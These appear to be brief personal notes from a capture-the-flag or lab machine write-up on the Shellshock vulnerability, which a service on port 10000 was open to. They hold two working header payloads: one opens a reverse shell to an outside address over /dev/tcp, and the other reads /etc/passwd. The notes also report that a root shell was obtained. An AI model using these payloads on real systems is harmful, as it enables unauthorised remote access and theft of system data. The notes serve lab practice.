shellshock was new to me


as per writeup port 10000 was vuln to shellshock


Note: if we find any application/ web server wwith resources with extension .csi-bin we can try for shellshock vulns


Shellshock in a nutshell:


If we replace the user-agent value of a request to this:

() { :;}; bash -i >& /dev/tcp/10.10.16.6/4444 0>&1


or this

() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \


we can see the results 




initially i was failing

found this resource

followed the same thing but this time it worked so anyway


got a reverse root shell on port 443


and closed this machine
